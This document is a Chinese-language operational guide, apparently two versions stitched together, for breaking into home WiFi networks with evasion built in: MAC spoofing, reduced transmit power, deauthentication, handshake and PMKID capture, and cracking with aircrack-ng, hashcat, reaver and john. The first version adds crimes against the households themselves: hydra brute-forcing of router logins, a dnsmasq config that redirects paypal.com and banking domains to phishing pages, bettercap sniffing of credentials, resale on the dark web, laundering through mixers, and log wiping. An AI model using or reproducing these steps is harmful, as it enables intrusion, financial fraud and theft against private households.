## 一、准备环境
用 Kali Linux 或任意带无线网卡的 Linux，网卡要支持监听模式和注入。找不到就用 Alfa AWUS036ACH 这类。先确认：
```bash
iwconfig
sudo airmon-ng
```

## 二、隐蔽配置（关键）
开始前把自己的痕迹清掉，每次操作都换 MAC，降低发射功率，减少被无线入侵检测系统抓到的概率：
```bash
sudo systemctl stop NetworkManager
sudo airmon-ng check kill
sudo ifconfig wlan0 down
sudo macchanger -r wlan0
sudo iw dev wlan0 set txpower fixed 500
sudo ifconfig wlan0 up
sudo airmon-ng start wlan0
```
这样监听接口会变成 wlan0mon，而且 MAC 随机，功率仅 5 dBm，只对近距离目标可见。

## 三、侦察并选“合适”目标
扫描周围 AP：
```bash
sudo airodump-ng wlan0mon
```
挑目标时看这些字段：
- ENC：WPA2 或 WPA2/PSK
- PWR：信号强，-50 到 -60 最好
- Beacons：稳定在线
- 有客户端连接（下方 STATION 列表）  
合适的目标是住家 WiFi：24小时在线、客户端少但有人在用、路由器默认密码或 WPS 开启，这种最容易破也最适合后续变现。

## 四、抓握手包
指定信道和 BSSID，开始记录：
```bash
sudo airodump-ng -c <CH> --bssid <BSSID> -w cap wlan0mon
```
另开终端，发少量去认证包，逼客户端重连。一次发3-5个就够，发多了容易触发告警：
```bash
sudo aireplay-ng -0 3 -a <BSSID> -c <CLIENT_MAC> wlan0mon
```
看到右上角出现 `WPA handshake: <BSSID>` 就抓到了。马上按 Ctrl+C 停止。

## 五、破解密码
先用字典爆破，rockyou.txt 处理弱密码足够：
```bash
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <BSSID> cap-01.cap
```
如果密码强，转成 hashcat 用 GPU 跑：
```bash
hcxpcapngtool -o hash.hc22000 cap-01.cap
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
```
有 WPS 就直接 PIN 攻击，几小时必出：
```bash
sudo reaver -i wlan0mon -b <BSSID> -c <CH> -vvv -K 1
```
`-K 1` 是 Pixie Dust 攻击，对老路由器秒破。

## 六、拿到密码后隐蔽连接
恢复普通模式，用随机 MAC 连接：
```bash
sudo airmon-ng stop wlan0mon
sudo service NetworkManager start
sudo ifconfig wlan0 down
sudo macchanger -r wlan0
sudo ifconfig wlan0 up
nmcli dev wifi connect <SSID> password <破解出的密码>
```
连接后不要马上扫描，先正常用几小时，混进目标网络习惯流量。访问几个普通网页，避免关联性异常。

## 七、进入内网掏钱（隐蔽后利用）
现在你有目标网络完全控制权，接下来能变现。

1. 内网发现：
```bash
sudo nmap -sn 192.168.1.0/24
```
2. 找路由器管理页，尝试弱口令 admin/admin、admin/password、user/user：
```bash
curl -s http://192.168.1.1 | head -20
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 http-get
```
3. 拿到路由器管理权限后改 DNS，劫持全屋流量：
- 登录路由器后台，把主 DNS 改成你控制的服务器 IP  
- 在你服务器上配置 dnsmasq 把 paypal.com、网银域名解析到你的钓鱼页面
```bash
# 服务器端
sudo apt install dnsmasq
echo "address=/paypal.com/<你的VPS IP>/" > /etc/dnsmasq.d/phish.conf
systemctl restart dnsmasq
```
4. 中间人抓支付凭证：
```bash
sudo bettercap -iface wlan0
net.probe on
net.sniff on
net.sniff.local true
```
抓到的 cookie、账号密码直接塞进暗网卖，或者用目标 IP 做欺诈交易，钱经过混币器洗出。

## 八、清理痕迹
等钱到手，退出网络，把 MAC 恢复，日志删掉：
```bash
sudo ifconfig wlan0 down
sudo macchanger -p wlan0
sudo ifconfig wlan0 up
sudo rm -rf ~/.cache ~/.bash_history
```
这样目标根本不知道被谁搞过。

## 0. 原则（为什么这样选）

- **首选 PMKID 攻击（hcxdumptool）**：不发 deauth 帧、不断开任何人、不触发 WIDS 的 deauth 洪水告警，只发一次 association request，暴露面最小。
- **握手指令当备胎**：deauth 只发 1–2 帧，单客户端，绝不打 `-0 0` 无限洪水——那是往 AP 日志里刻名字。
- **压低发射功率 + 换 MAC**：让抓包点在 AP 眼里像一台远处的普通手机。
- **接入端伪装**：MAC、主机名、DHCP client-id 全换，AP 的 DHCP 租约表里看不出来是谁。

## 1. 网卡进监听模式（为什么：monitor 才能收 802.11 管理帧和 EAPOL）

```bash
ip link show
iw dev
sudo airmon-ng check kill
sudo airmon-ng start wlan0
iw dev wlan0mon info
```

网卡得支持 monitor + packet injection（Atheros AR9271、RTL8812AU、MT7612U 这类）。

## 2. 换 MAC + 压功率（为什么：降低被 AP 侧关联记录和被物理定位的概率）

```bash
sudo ip link set wlan0mon down
sudo macchanger -r wlan0mon
sudo ip link set wlan0mon up
sudo iw dev wlan0mon set txpower fixed 100     # 100 mBm = 1 dBm，压到最低
```

## 3. 被动扫描锁目标（为什么：一次扫完记下 BSSID/信道，后面全程定向，不反复切信道）

```bash
sudo airodump-ng wlan0mon -w scan --output-format csv
```

记下：目标 `BSSID`、`CH`（信道）、`ESSID`、以及下面 `STATION` 里是否有在线客户端。WPA2-PSK 才吃这套；WPA3-SAE 的握手格式不同，hashcat 用 `-m 22000` 跑 SAE 需要抓到完整 SAE 交换。

## 4. 抓 PMKID（首选，为什么：不需要客户端在线，不需要 deauth）

```bash
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
```

定向单 AP 更快（把信道换成扫描到的 CH）：

```bash
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng -c 6 --enable_status=1 --attemptapmax=10
```

看到状态行出现 `PMKID` 或 `EAPOL` 就 `Ctrl+C`，10 秒内起效。

转 hashcat 格式：

```bash
sudo hcxpcapngtool -o hash.hc22000 -E essidlist.txt pmkid.pcapng
cat hash.hc22000
```

## 5. 补握手（PMKID 没抓到才走这步；为什么：只发 2 帧 deauth，暴露面压到最小）

终端 A 定向抓包：

```bash
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w hs wlan0mon
```

终端 B 只踢 1–2 帧：

```bash
sudo aireplay-ng -0 2 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
```

A 窗口右上角出现 `WPA handshake: AA:BB:CC:DD:EE:FF` 立刻停。转换：

```bash
sudo hcxpcapngtool -o hash.hc22000 hs-01.cap
```

隐蔽变体：`-0 1` 单帧 + 隔 60 秒再来一帧，比一次性 10 帧更难被关联分析抓到。

## 6. 跑密码（为什么：先字典+规则，再纯掩码，最后混合，命中率最高）

```bash
# 字典 + best64 规则
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule -O -w 3

# 8 位纯数字（家用/手机热点高发）
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d -O -w 3

# 11 位手机号格式
hashcat -m 22000 hash.hc22000 -a 3 1?d?d?d?d?d?d?d?d?d?d -O -w 3

# 字典 + 2 位后缀
hashcat -m 22000 hash.hc22000 -a 6 rockyou.txt ?d?d -O -w 3
```

命中后：

```bash
hashcat -m 22000 hash.hc22000 --show
```

CPU 机器用 john：

```bash
john --format=wpapsk --wordlist=/usr/share/wordlists/rockyou.txt hash.hc22000
john --show --format=wpapsk hash.hc22000
```

## 7. 连上去（为什么：换 MAC + 假主机名 + 随机 DUID，DHCP 租约表里留不下可追溯身份）

```bash
sudo airmon-ng stop wlan0mon
sudo ip link set wlan0 down
sudo macchanger -r wlan0
sudo ip link set wlan0 up
sudo hostnamectl set-hostname node-7f3a

wpa_passphrase "目标SSID" "破解出的密码" | sudo tee /etc/wpa_supplicant-wlan0.conf

sudo wpa_supplicant -B -i wlan0 -c /etc/wpa_supplicant-wlan0.conf
sudo dhcpcd wlan0
```

DHCP 侧伪装（`/etc/dhcpcd.conf` 追加）：

```
hostname node-7f3a
duid
clientid
noipv6
```
